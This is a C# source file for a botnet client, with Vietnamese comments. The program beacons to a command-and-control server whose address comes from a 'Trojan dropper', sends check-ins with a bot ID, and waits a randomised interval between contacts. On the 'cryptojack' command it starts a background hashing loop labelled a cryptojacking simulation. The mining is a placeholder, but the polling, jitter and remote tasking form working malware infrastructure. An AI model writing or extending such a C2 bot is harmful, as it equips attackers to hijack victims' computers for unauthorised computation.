using System;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

// === NÂNG CẤP: Dùng hằng số để tránh lỗi chính tả ===
public static class BotCommands
{
    public const string Cryptojack = "cryptojack";
    public const string Idle = "idle";
}

public class Bot
{
    private static string CncServerUrl;
    private static readonly HttpClient client = new HttpClient();
    private static string botId = Guid.NewGuid().ToString();
    private static string currentStatus = BotCommands.Idle;
    private static Random _random = new Random();

    // === NÂNG CẤP: Dùng CancellationTokenSource để quản lý tác vụ nền an toàn ===
    private static CancellationTokenSource _taskCancellationTokenSource;

    static async Task Main(string[] args)
    {
        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
        {
            string serverIp = args[0];
            CncServerUrl = $"http://{serverIp}:8000"; // Gán giá trị cho CncServerUrl
            Console.WriteLine($"C&C Server IP received from dropper: {CncServerUrl}");
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("FATAL: C&C Server IP was not provided.");
            Console.WriteLine("This bot must be started by the Trojan dropper to function.");
            Console.ResetColor();
            Console.ReadLine(); // Dừng chương trình lại để người dùng đọc lỗi
            return; // Thoát chương trình
        }

        Console.WriteLine($"Bot started with ID: {botId}");

        while (true)
        {
            try
            {
                await CheckIn();
                string command = await GetCommand();
                Console.WriteLine($"Received command: '{command}'");
                ExecuteCommand(command);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
            }

            int jitterMilliseconds = _random.Next(15000, 30001);
            Console.WriteLine($"Waiting for {jitterMilliseconds / 1000}s...");
            await Task.Delay(jitterMilliseconds);
        }
    }

    static async Task CheckIn()
    {
        var botInfo = new { BotId = botId, Status = currentStatus };
        var content = new StringContent(JsonSerializer.Serialize(botInfo), Encoding.UTF8, "application/json");
        await client.PostAsync($"{CncServerUrl}/bot/checkin", content);
    }

    static async Task<string> GetCommand()
    {
        var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand?botId={botId}");
        var commandResponse = JsonSerializer.Deserialize<CommandResponse>(responseString, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
        return commandResponse?.command ?? BotCommands.Idle;
    }

    static void ExecuteCommand(string command)
    {
        switch (command)
        {
            case BotCommands.Cryptojack:
                if (currentStatus != BotCommands.Cryptojack)
                {
                    StopCurrentTask(); // Dừng tác vụ cũ (nếu có) trước khi bắt đầu tác vụ mới
                    currentStatus = BotCommands.Cryptojack;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Executing cryptojacking simulation...");
                    Console.ResetColor();

                    // === NÂNG CẤP: Quản lý tác vụ bằng CancellationToken ===
                    _taskCancellationTokenSource = new CancellationTokenSource();
                    SimulateCryptoJack(_taskCancellationTokenSource.Token);
                }
                break;

            case BotCommands.Idle:
            default:
                if (currentStatus != BotCommands.Idle)
                {
                    currentStatus = BotCommands.Idle;
                    StopCurrentTask();
                }
                break;
        }
    }

    // === NÂNG CẤP: Hàm helper để hủy tác vụ một cách an toàn ===
    static void StopCurrentTask()
    {
        if (_taskCancellationTokenSource != null && !_taskCancellationTokenSource.IsCancellationRequested)
        {
            Console.WriteLine("Stopping current task...");
            _taskCancellationTokenSource.Cancel();
            _taskCancellationTokenSource.Dispose();
            _taskCancellationTokenSource = null;
        }
    }

    static void SimulateCryptoJack(CancellationToken cancellationToken)
    {
        Task.Run(() =>
        {
            // === NÂNG CẤP: Xử lý lỗi bên trong Task ===
            try
            {
                using (SHA256 sha256 = SHA256.Create())
                {
                    long nonce = 0;
                    // === NÂNG CẤP: Dùng CancellationToken để dừng vòng lặp ===
                    while (!cancellationToken.IsCancellationRequested)
                    {
                        string dataToHash = $"SomeDataToHash-{nonce}";
                        byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
                        nonce++;
                        if (nonce % 100000 == 0) Thread.Sleep(1);
                    }
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Cryptojacking simulation stopped gracefully.");
                    Console.ResetColor();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
                Console.ResetColor();
                // Trong kịch bản thực tế, có thể ghi log ở đây
            }
        }, cancellationToken);
    }
}

public class CommandResponse
{
    public string command { get; set; }
}